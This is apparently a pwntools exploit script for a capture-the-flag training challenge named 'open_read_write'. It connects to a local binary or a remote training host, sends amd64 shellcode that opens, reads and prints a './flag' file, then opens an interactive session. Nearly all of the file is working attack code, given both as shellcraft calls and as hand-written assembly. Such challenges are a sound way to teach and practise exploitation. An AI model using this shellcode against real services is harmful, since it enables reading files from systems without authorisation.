from pwn import *
import sys

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./open_read_write")
        gdb.attach(c, """
        c
        """)
        input("Wait")
    elif(sys.argv[1] == '-r'):
        c = remote("open-read-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./open_read_write")

shellcode = pwnlib.shellcraft.amd64.linux.open("./flag", 0, 0)
shellcode += pwnlib.shellcraft.amd64.linux.read(3, 'rsp', 100)
shellcode += pwnlib.shellcraft.amd64.linux.write(1, 'rsp', 100)

shellcode = """
    /* open(file='./flag', oflag=0, mode=0) */
    /* push b'./flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f2e
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
    /* call read(3, 'rsp', 0x64) */
    xor eax, eax /* SYS_read */
    push 3
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    syscall
    /* write(fd=1, buf='rsp', n=0x64) */
    push 1
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
"""

print(shellcode)

c.sendline(asm(shellcode))

c.interactive()
